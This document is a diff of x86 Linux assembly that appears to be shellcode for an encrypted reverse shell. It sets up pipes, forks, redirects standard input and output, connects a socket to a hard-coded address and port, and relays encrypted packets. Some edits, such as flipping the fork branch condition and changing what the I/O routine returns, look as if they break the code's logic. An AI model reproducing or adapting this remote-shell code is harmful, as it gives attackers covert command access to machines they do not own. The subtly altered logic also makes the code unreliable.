@@ -143,19 +143,19 @@ c_pipe:
       ; pipe(out);
       push   SYS_pipe
       pop    eax
-      mov    ebx, edi             ; ebx = p_in or p_out      
+      mov    ebx, edi        ; ebx = p_in or p_out      
       int    0x80      
-      scasd                       ; edi += 4
-      scasd                       ; edi += 4
+      scasd                  ; edi += 4
+      scasd                  ; edi += 4
       loop   c_pipe    
       
       ; pid = fork();
       push   SYS_fork
       pop    eax
       int    0x80    
-      stosd                       ; save pid
-      test   eax, eax             ; already forked?
-      jz     opn_con              ; open connection
+      stosd                  ; save pid
+      test   eax, eax        ; already forked?
+      jnz    opn_con         ; open connection
 
       ; in this order..
       ;
@@ -168,8 +168,8 @@ c_dup:
       push   SYS_dup2
       pop    eax
       int    0x80
-      dec    ecx               ; becomes STDOUT_FILENO, then STDIN_FILENO      
-      cmove  ebx, [ebp+p_in]   ; replace stdin with in[0] for last call
+      dec    ecx   ; STDOUT_FILENO, then STDIN_FILENO      
+      cmove  ebx, [ebp+p_in] ; replace stdin with in[0]
       jns    c_dup  
   
       ; close pipe handles in this order..
@@ -224,9 +224,9 @@ opn_con:
       int    0x80 
       stosd                    ; save socket
 
-      push   0x0100007f        ; sa.sin_addr=127.0.0.1
-      push   0xD2040002        ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
-      mov    ecx, esp          ; ecx = &sa
+      push   0x0100007f  ; sa.sin_addr=127.0.0.1
+      push   0xD2040002  ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
+      mov    ecx, esp    ; ecx = &sa
       
       ; connect (s, &sa, sizeof(sa));    
       push   16                ; sizeof(sa)      
@@ -376,14 +376,14 @@ cls_efd:
       
 ; ***********************************
 ;
-; send packet, fragmented if required
+; send or receive packet, fragmented if required
 ;
 ; buflen in edx
 ; buf in edi
 ; ctx in ebp
 ; sock op in ebx : SYS_RECV or SYS_SEND
 ; ***********************************      
-sock_io:
+socket_io:
       pushad
       xor    esi, esi         ; sum = 0
 io_loop:
@@ -410,8 +410,8 @@ io_loop:
       add    esi, eax         ; sum += len
       jmp    io_loop
 exit_io:
-      test   esi, esi
-      mov    [esp+_eax], esi  ; return sum          
+      test   eax, eax
+      mov    [esp+_eax], eax  ; return sum          
       popad
       ret      
 ; ***********************************
@@ -431,8 +431,7 @@ send_pkt:
       ; 2. send
       push   SYS_SEND
       pop    ebx
-      call   sock_io
-      mov    [esp+_eax], eax  ; return sum    
+      call   socket_io   
       popad
       ret
 ; ***********************************
@@ -474,7 +473,7 @@ recv_pkt:
       ; 1. receive
       push   SYS_RECV
       pop    ebx
-      call   sock_io    
+      call   socket_io    
       ; 2. unwrap
       push   1
       pop    ecx              ; ecx = DECRYPT
